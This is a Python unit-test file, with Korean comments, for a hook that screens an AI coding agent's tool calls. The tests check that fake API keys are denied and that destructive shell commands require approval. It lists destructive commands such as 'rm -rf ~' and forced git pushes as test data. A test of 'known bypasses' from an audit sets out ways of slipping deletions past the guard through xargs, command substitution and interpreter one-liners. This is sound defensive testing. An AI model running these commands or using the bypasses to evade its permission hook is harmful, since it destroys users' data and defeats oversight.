import importlib.util
import json
import subprocess
import sys
import unittest
from pathlib import Path

from ro import log

GUARD = Path(__file__).resolve().parent.parent / "ro" / "hooks" / "ro_guard.py"
spec = importlib.util.spec_from_file_location("ro_guard", GUARD)
guard = importlib.util.module_from_spec(spec)
spec.loader.exec_module(guard)

# 가짜 비밀값은 이어 붙여 만든다(소스에 패턴 그대로 두면 비밀 스캐너·이 훅에 걸린다).
FAKE_KEY = "sk-" + "a1B2c3D4" * 3
FAKE_GH = "ghp_" + "Z9y8X7w6" * 3


def run(mode, tool, **inp):
    p = subprocess.run([sys.executable, str(GUARD), mode], input=json.dumps({"tool_name": tool, "tool_input": inp}),
                       capture_output=True, text=True)
    assert p.returncode == 0
    return json.loads(p.stdout)["hookSpecificOutput"] if p.stdout.strip() else None


class Secrets(unittest.TestCase):
    def test_pattern_matches_log_module(self):
        self.assertEqual(guard.SECRET_VALUE.pattern, log.SECRET_VALUE.pattern)

    def test_denies_secret_in_each_tool(self):
        for tool, inp in (("Bash", {"command": f"curl -H 'x: {FAKE_KEY}' https://e.test"}),
                          ("Write", {"file_path": "a.py", "content": f"K='{FAKE_GH}'"}),
                          ("Edit", {"file_path": "a.py", "old_string": "x", "new_string": FAKE_KEY}),
                          ("MultiEdit", {"file_path": "a.py", "edits": [{"old_string": "a", "new_string": "b"},
                                                                        {"old_string": "c", "new_string": FAKE_GH}]})):
            out = run("secrets", tool, **inp)
            self.assertEqual(out["permissionDecision"], "deny", tool)

    def test_reason_never_contains_the_value(self):
        out = run("secrets", "Bash", command=f"echo {FAKE_KEY}")
        self.assertNotIn(FAKE_KEY, json.dumps(out))

    def test_allows_normal_calls(self):
        self.assertIsNone(run("secrets", "Bash", command="git status && ls -la"))
        self.assertIsNone(run("secrets", "Write", file_path="a.py", content="print('sk-short')"))
        self.assertIsNone(run("secrets", "Read", file_path="/etc/hosts"))


class Destructive(unittest.TestCase):
    def asks(self, cmd):
        out = run("destructive", "Bash", command=cmd)
        self.assertIsNotNone(out, cmd)
        self.assertEqual(out["permissionDecision"], "ask", cmd)

    def passes(self, cmd):
        self.assertIsNone(run("destructive", "Bash", command=cmd), cmd)

    def test_rm_recursive_outside_safe_dirs_asks(self):
        for c in ("rm -rf /", "rm -rf ~", "rm -rf $HOME/x", "rm -fr ./src", "rm -r -f /Users/me/Documents",
                  "rm -rf /tmp/../Users/me", "rm -rf /tmp/*", "ls && rm -rf data",
                  "bash -c 'rm -rf /Users/me/x'", "sudo rm -rf /var/lib/x"):
            self.asks(c)

    def test_rm_in_temp_or_regenerable_dirs_passes(self):
        for c in ("rm -rf /tmp/x", "rm -rf /private/tmp/claude-501/a/b", "rm -rf node_modules", "rm -rf ./__pycache__",
                  "rm file.txt", "rm -f /Users/me/one.txt"):
            self.passes(c)

    def test_git_destructive_asks_and_safe_variants_pass(self):
        for c in ("git push --force origin main", "git push -f", "git reset --hard HEAD~1", "git clean -fd",
                  "git checkout ."):
            self.asks(c)
        for c in ("git push --force-with-lease", "git push origin main", "git reset --soft HEAD~1", "git status"):
            self.passes(c)

    def test_known_bypasses_ask(self):
        # 2026-10-30 재감사에서 재현된 우회: 대상 없는 rm(xargs가 채움), git 전역 옵션, + 강제 푸시, find 삭제, 명령 치환
        for c in ("find ~ -name x | xargs rm -rf", "git -C repo reset --hard", "git -C ../r push -f",
                  "git push origin +main", "find ~/Documents -delete", "find . -name '*.log' -exec rm {} +",
                  "echo $(rm -rf ~/x)", "echo `rm -rf ~/x`",
                  "python3 -c 'import shutil; shutil.rmtree(\"/Users/me/x\")'", "python -c 'import os; os.remove(\"a\")'",
                  "python3.13 -c 'from pathlib import Path; Path(\"a\").unlink()'",
                  "node -e 'require(\"fs\").rmSync(\"x\", {recursive: true})'", "perl -e 'unlink glob \"*\"'",
                  "ruby -e 'require \"fileutils\"; FileUtils.rm_rf(\"x\")'"):
            self.asks(c)
        for c in ("find /tmp/x -delete", "find . -name x", "git -C repo status", "git push origin main:main",
                  "echo $(date)", "python3 -c 'print(1)'", "python3 -m pytest -q", "node -e 'console.log(1)'"):
            self.passes(c)

    def test_other_tools_are_ignored(self):
        self.assertIsNone(run("destructive", "Write", file_path="a", content="rm -rf /"))


class FailOpen(unittest.TestCase):
    def test_bad_input_does_not_block(self):
        for stdin, mode in (("not json", "secrets"), ("{}", "nope"), ("", "destructive")):
            p = subprocess.run([sys.executable, str(GUARD), mode], input=stdin, capture_output=True, text=True)
            self.assertEqual((p.returncode, p.stdout.strip()), (0, ""))
            if mode != "nope":                   # 읽지 못한 입력은 막지 않지만 조용히 넘기지도 않는다
                self.assertIn("보호 없이", p.stderr)


if __name__ == "__main__":
    unittest.main()
